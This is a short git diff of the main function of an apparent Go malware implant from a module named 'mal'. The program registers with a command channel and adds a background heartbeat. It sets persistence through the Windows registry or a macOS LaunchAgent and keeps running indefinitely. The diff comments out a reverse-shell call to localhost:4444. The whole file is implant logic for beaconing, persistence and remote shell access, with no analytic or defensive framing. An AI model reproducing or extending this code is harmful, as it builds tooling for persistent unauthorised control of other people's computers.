@@ -3,13 +3,14 @@ package main
 import (
 	communications "mal/comms"
 	"mal/persistence"
-	"mal/reverse"
+	//"mal/reverse"
 	"runtime"
 )
 
 func main() {
 
 	communications.Register()
+	go communications.Heartbeat()
 
 	if runtime.GOOS == "windows" {
 		persistence.AddToRegistry()
@@ -19,5 +20,6 @@ func main() {
 		persistence.AddToLaunchAgent()
 	}
 
-	reverse.StartReverseShell("localhost:4444")
+	select {}
+	//reverse.StartReverseShell("localhost:4444")
 }
